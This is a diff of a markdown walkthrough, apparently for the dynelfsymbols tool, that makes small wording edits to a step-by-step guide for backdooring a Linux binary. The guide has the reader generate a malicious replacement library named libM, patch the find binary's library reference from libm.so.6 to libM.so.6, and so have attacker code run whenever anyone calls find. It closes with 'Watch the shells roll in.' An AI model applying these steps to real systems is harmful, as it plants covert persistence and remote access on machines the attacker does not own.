@@ -8,7 +8,7 @@ A command-by-command, easy-button walkthrough.
 go get -u github.com/magisterquis/dynelfsymbols
 GOOS=linux go build -o ./dynelfsymbols github.com/magisterquis/dynelfsymbols/dynelfsymbols
 ```
-This should probably be done on the attack box, and not on-target.  Move the
+This should probably be done on the attack box, and not on target.  Move the
 resulting binary to the target.
 
 2. Find a good candidate for backdooring
@@ -43,16 +43,16 @@ Library    Symbol                  Version
 libm.so.6  modf                    GLIBC_2.2.5
 ...snip...
 ```
-The function `modf` is imported from `libm.so.6` with version `GLIBC_2.2.5`.
-Sometime the same number of symbols are imported from multiple libraries, in
-which case it's probably best to choose the one least likely to be used or the
-one for which documentation is easiest to find.
+The function `modf` (with version `GLIBC_2.2.5`) is the only symbol imported
+from `libm.so.6`.  Sometimes the same number of symbols are imported from
+multiple libraries, in which case it's probably best to choose the one least
+likely to be used or the one for which documentation is easiest to find.
 
 4. Generate malicious library source
 ------------------------------------
 Now that we've got the real library to replace (`libm.so.6`), we need to
-generate our own malicious library.  We'll choose a name that's likely to not
-be too conspicuous.
+generate our own malicious library.  We'll choose the name `libM` as that's
+likely to not be too conspicuous.
 
 ```bash
 ./dynelfsymbols -c libm.so.6 /usr/bin/find > libM.c
@@ -123,29 +123,23 @@ should be near the top of the file, nearby other library and function names.
 
 In vim, this looks like changing
 ```plaintext
+...snip...
 @libselinux.so.1^@_ITM_deregisterTMCloneTable^@__gmon_start__^@_Jv_RegisterClas
 ses^@_ITM_registerTMCloneTable^@_init^@is_selinux_enabled^@fgetfilecon^@freecon
 ^@lgetfilecon^@lsetfilecon^@_fini^@libm.so.6^@modf^@libc.so.6^@__stpcpy_chk^@ff
 lush^@strcpy^@__printf_chk^@re_set_syntax^@fnmatch^@readdir^@sprintf^@_IO_putc^
 @setlocale^@mbrtowc^@fopen^@strncmp^@strrchr^@re_match^@readlinkat^@__strdup^@r
-pmatch^@dcgettext^@getpwuid^@unlinkat^@closedir^@fchdir^@getgrgid^@signal^@strn
-cpy^@fork^@__stack_chk_fail^@__lxstat^@putchar^@iswprint^@realloc^@fstatfs^@abo
-rt^@stdin^@_exit^@memchr^@strpbrk^@memrchr^@strspn^@program_invocation_name^@st
-rftime^@__assert_fail^@localtime_r^@strtod^@__ctype_get_mb_cur_max^@endpwent^@s
-trtol^@fts_close^@isatty^
+...snip...
 ```
 to
 ```plaintext
+...snip...
 @libselinux.so.1^@_ITM_deregisterTMCloneTable^@__gmon_start__^@_Jv_RegisterClas
 ses^@_ITM_registerTMCloneTable^@_init^@is_selinux_enabled^@fgetfilecon^@freecon
 ^@lgetfilecon^@lsetfilecon^@_fini^@libM.so.6^@modf^@libc.so.6^@__stpcpy_chk^@ff
 lush^@strcpy^@__printf_chk^@re_set_syntax^@fnmatch^@readdir^@sprintf^@_IO_putc^
 @setlocale^@mbrtowc^@fopen^@strncmp^@strrchr^@re_match^@readlinkat^@__strdup^@r
-pmatch^@dcgettext^@getpwuid^@unlinkat^@closedir^@fchdir^@getgrgid^@signal^@strn
-cpy^@fork^@__stack_chk_fail^@__lxstat^@putchar^@iswprint^@realloc^@fstatfs^@abo
-rt^@stdin^@_exit^@memchr^@strpbrk^@memrchr^@strspn^@program_invocation_name^@st
-rftime^@__assert_fail^@localtime_r^@strtod^@__ctype_get_mb_cur_max^@endpwent^@s
-trtol^@fts_close^@isatty^
+...snip...
 ```
 
 It should also be possible to use sed to do the same thing, but there is the
@@ -157,4 +151,4 @@ sed -i '/libm\.so\.6/libM\.so\.6'
 8.  That's it!
 --------------
 Now, any time someone calls `find(1)`, whatever malicious code you added to
-libM will be run.  Watch the shells roll in.
+`libM` will be run.  Watch the shells roll in.
